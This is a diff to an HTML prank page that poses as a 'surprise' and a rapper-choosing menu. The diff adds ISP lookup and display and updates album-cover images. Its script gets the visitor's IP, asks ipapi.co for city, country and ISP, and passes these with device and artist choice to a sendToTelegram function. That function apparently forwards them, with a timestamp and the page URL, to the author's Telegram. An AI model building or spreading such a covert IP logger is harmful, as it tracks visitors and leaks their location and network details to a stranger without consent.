@@ -161,17 +161,18 @@
 
       <!-- STEP 1: IP -->
       <div id="result-ip" class="result hidden">
-        This is ur ip adress if u didnt know tongue_stuck_out:<br>
+        This is ur ip adress if u didnt know <span style="font-size:2.2rem">😭👅</span><br>
         <span id="ip" style="color:#ff0000; font-size:1.8rem;">...</span>
         <br><br>
         <button class="btn" onclick="revealLocation()">CLICK ME FOR ANOTHER SURPRISE</button>
       </div>
 
-      <!-- STEP 2: CITY + COUNTRY -->
+      <!-- STEP 2: CITY + COUNTRY + ISP -->
       <div id="result-location" class="result hidden">
         <div>Here’s where you are:</div>
         <div id="city" style="color:#ff6666; font-size:1.7rem;">...</div>
         <div id="country" style="color:#ff9999; font-size:1.5rem;">...</div>
+        <div id="isp" style="color:#ffcccc; font-size:1.4rem;">...</div>
       </div>
 
       <div class="by">BY ZENNY!</div>
@@ -181,15 +182,15 @@
   <!-- ARTIST CHOICE (SCROLL DOWN) -->
   <div class="artists">
     <div class="artist-btn" onclick="chooseArtist('Drake')">
-      <img src="https://upload.wikimedia.org/wikipedia/en/9/90/Certified_Lover_Boy.jpeg" class="artist-img" alt="Drake">
+      <img src="https://i.scdn.co/image/ab67616d0000b273b8d72a5b5a0d5c7b7c1f3e1d" class="artist-img" alt="Drake - Certified Lover Boy">
       <span>DRAKE</span>
     </div>
     <div class="artist-btn" onclick="chooseArtist('Playboi Carti')">
-      <img src="https://upload.wikimedia.org/wikipedia/en/2/2a/Playboi_Carti_-_Whole_Lotta_Red.png" class="artist-img" alt="Playboi Carti">
+      <img src="https://upload.wikimedia.org/wikipedia/en/2/2a/Playboi_Carti_-_Whole_Lotta_Red.png" class="artist-img" alt="Playboi Carti - Whole Lotta Red">
       <span>PLAYBOI CARTI</span>
     </div>
     <div class="artist-btn" onclick="chooseArtist('Ken Carson')">
-      <img src="https://upload.wikimedia.org/wikipedia/en/2/2f/Ken_Carson_More_Chaos.jpg" class="artist-img" alt="Ken Carson">
+      <img src="https://upload.wikimedia.org/wikipedia/en/2/2f/Ken_Carson_More_Chaos.jpg" class="artist-img" alt="Ken Carson - More Chaos">
       <span>KEN CARSON</span>
     </div>
   </div>
@@ -214,7 +215,7 @@
 
     let userIP = "";
 
-    // === SEND TO TELEGRAM (PRO FORMAT) ===
+    // === SEND TO TELEGRAM (PRO FORMAT WITH ISP) ===
     function sendToTelegram(ip, city = "", country = "", isp = "", device = "", artist = "") {
       const time = new Date().toLocaleString();
       const site = location.href;
@@ -249,7 +250,7 @@ Site: <a href="${site}">${site}</a>`;
         });
     }
 
-    // === STEP 2: GET LOCATION + ISP ===
+    // === STEP 2: GET CITY + COUNTRY + ISP ===
     function getLocation() {
       fetch(`https://ipapi.co/${userIP}/json/`)
         .then(r => r.json())
@@ -261,6 +262,7 @@ Site: <a href="${site}">${site}</a>`;
 
           document.getElementById('city').innerHTML = city;
           document.getElementById('country').innerHTML = country;
+          document.getElementById('isp').innerHTML = isp;
 
           sendToTelegram(userIP, city, country, isp, device);
         })
